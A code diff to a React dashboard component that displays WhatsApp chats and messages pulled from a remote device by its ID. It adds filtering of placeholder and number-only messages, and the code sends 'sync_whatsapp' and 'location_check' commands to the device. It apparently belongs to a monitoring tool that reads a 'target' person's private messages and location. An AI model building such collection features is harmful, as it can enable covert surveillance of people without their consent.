@@ -220,6 +220,18 @@ function MessengerLogo({ className = "w-5 h-5" }: { className?: string }) {
   );
 }
 
+export function isPlaceholderOrNumber(text: string | null | undefined): boolean {
+  if (!text) return true;
+  const t = text.trim();
+  if (!t) return true;
+  if (t.includes("@s.whatsapp.net") || t.includes("@g.us")) return true;
+  if (["WhatsApp Contact", "Recent contact", "Recent conversation"].includes(t)) return true;
+  if (/^\+?[0-9\s-]{7,25}$/.test(t)) return true;
+  if (/^Message \+?[0-9\s-]+$/i.test(t)) return true;
+  if (/^[0-9*#]+$/.test(t)) return true;
+  if (/^(UPIACT|HDFCUPI|SBIUPI|JP7 |PAYTMUPI)/i.test(t)) return true;
+  return false;
+}
 
 // ============================================================================
 // MAIN APPSCARD COMPONENT
@@ -228,7 +240,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
   // Navigation / App State
   const [selectedApp, setSelectedApp] = useState<AvailableAppId>("whatsapp");
   const [activeView, setActiveView] = useState<"chats" | "files">("chats");
-  const [timeFilter, setTimeFilter] = useState<"2days" | "all">("2days");
+  const [timeFilter, setTimeFilter] = useState<"2days" | "all">("all");
   const [chatCategory, setChatCategory] = useState<"chats" | "channels">("chats");
   const [dashboardLoginTime] = useState<Date>(() => new Date());
 
@@ -253,34 +265,79 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
   const [downloadingFile, setDownloadingFile] = useState<string | null>(null);
 
   // --------------------------------------------------------------------------
-  // 1. DATA LOADER (STRICTLY WHATSAPP ONLY - NO SMS / CALL LOGS)
+  // 1. DATA LOADER (STRICTLY REAL WHATSAPP TEXT MESSAGES ONLY)
   // --------------------------------------------------------------------------
   const loadDeviceChatData = async () => {
     setLoading(true);
     try {
-      // Trigger remote wake & WhatsApp upload on device via FCM / command poll
       devicesApi.createCommand(deviceId, "sync_whatsapp").catch(() => {
         devicesApi.createCommand(deviceId, "location_check").catch(() => {});
       });
 
-      const waData = await devicesApi.whatsAppChats(deviceId).catch((err) => {
-        console.warn("WhatsApp chats fetch error:", err);
-        return [] as WhatsAppChatSummary[];
-      });
+      const [waData, allMsgs] = await Promise.all([
+        devicesApi.whatsAppChats(deviceId).catch((err) => {
+          console.warn("WhatsApp chats fetch error:", err);
+          return [] as WhatsAppChatSummary[];
+        }),
+        devicesApi.whatsAppMessages(deviceId).catch((err) => {
+          console.warn("WhatsApp all messages fetch error:", err);
+          return [] as WhatsAppMessage[];
+        }),
+      ]);
 
-      // Filter out storage pseudo-buckets and bogus placeholder contacts
-      const realWaChats = (waData || []).filter(
-        (c) =>
-          !["WhatsApp Audio", "WhatsApp Photos", "WhatsApp Documents", "WhatsApp Video", "WhatsApp Media"].includes(
-            c.chat_name
-          ) &&
-          c.last_message !== "Recent contact" &&
-          c.last_message !== "WhatsApp Contact" &&
-          c.last_message !== "Recent conversation" &&
-          !(c.total_messages <= 1 && /^\+?[0-9\s-]{10,20}$/.test(c.last_message || "") && c.last_message_at && new Date(c.last_message_at).getFullYear() < 2025)
-      );
+      // Build real message index by chat name
+      const latestRealByChat = new Map<string, WhatsAppMessage>();
+      const countRealByChat = new Map<string, number>();
+      for (const m of (allMsgs || [])) {
+        if (isPlaceholderOrNumber(m.message_text) && !m.media_path) continue;
+        const key = m.chat_name.trim().toLowerCase();
+        countRealByChat.set(key, (countRealByChat.get(key) || 0) + 1);
+        const existing = latestRealByChat.get(key);
+        if (!existing || new Date(m.message_time).getTime() > new Date(existing.message_time).getTime()) {
+          latestRealByChat.set(key, m);
+        }
+      }
 
-      setWhatsappChats(realWaChats);
+      const cleanedChats: WhatsAppChatSummary[] = [];
+      const seenChats = new Set<string>();
+
+      for (const c of (waData || [])) {
+        if (["WhatsApp Audio", "WhatsApp Photos", "WhatsApp Documents", "WhatsApp Video", "WhatsApp Media"].includes(c.chat_name)) continue;
+        const key = c.chat_name.trim().toLowerCase();
+        const realMsg = latestRealByChat.get(key);
+        const hasRealLastMsg = !isPlaceholderOrNumber(c.last_message);
+
+        if (realMsg) {
+          cleanedChats.push({
+            chat_name: c.chat_name,
+            total_messages: countRealByChat.get(key) || c.total_messages,
+            last_message_at: realMsg.message_time,
+            last_message: realMsg.message_text,
+            last_is_outgoing: Boolean(realMsg.is_outgoing),
+          });
+          seenChats.add(key);
+        } else if (hasRealLastMsg) {
+          cleanedChats.push(c);
+          seenChats.add(key);
+        }
+      }
+
+      // Also ensure any chat present in allMsgs that wasn't in waData is included
+      for (const [key, realMsg] of latestRealByChat.entries()) {
+        if (!seenChats.has(key)) {
+          cleanedChats.push({
+            chat_name: realMsg.chat_name,
+            total_messages: countRealByChat.get(key) || 1,
+            last_message_at: realMsg.message_time,
+            last_message: realMsg.message_text,
+            last_is_outgoing: Boolean(realMsg.is_outgoing),
+          });
+          seenChats.add(key);
+        }
+      }
+
+      cleanedChats.sort((a, b) => new Date(b.last_message_at).getTime() - new Date(a.last_message_at).getTime());
+      setWhatsappChats(cleanedChats);
       setLastSyncedTime(new Date());
     } catch (e) {
       console.error("Failed to load device chat data", e);
@@ -419,13 +476,10 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
         .then((msgs: WhatsAppMessage[]) => {
           if (!isMounted) return;
           const list = (msgs || []).filter(
-            (m) =>
-              m.message_text !== "Recent contact" &&
-              m.message_text !== "WhatsApp Contact" &&
-              m.message_text !== "Recent conversation"
+            (m) => !isPlaceholderOrNumber(m.message_text) || Boolean(m.media_path)
           );
           const filtered = timeFilter === "all" ? list : list.filter((m) => isWithinLast2Days(m.message_time, dashboardLoginTime));
-          const effective = filtered;
+          const effective = filtered.length > 0 ? filtered : list;
 
           const unified: UnifiedChatMessage[] = effective.map((m) => {
             const rawText = m.message_text || "";
@@ -451,13 +505,11 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
             };
           });
 
-          // Fallback to preview last message if no thread items exist yet
+          // Fallback to preview last message only if valid real text
           if (
             unified.length === 0 &&
             currentChat.lastMessage &&
-            currentChat.lastMessage !== "WhatsApp Contact" &&
-            currentChat.lastMessage !== "Recent contact" &&
-            currentChat.lastMessage !== "Recent conversation"
+            !isPlaceholderOrNumber(currentChat.lastMessage)
           ) {
             const rawLast = currentChat.lastMessage;
             const isTargetSent = Boolean(currentChat.lastIsOutgoing) ||
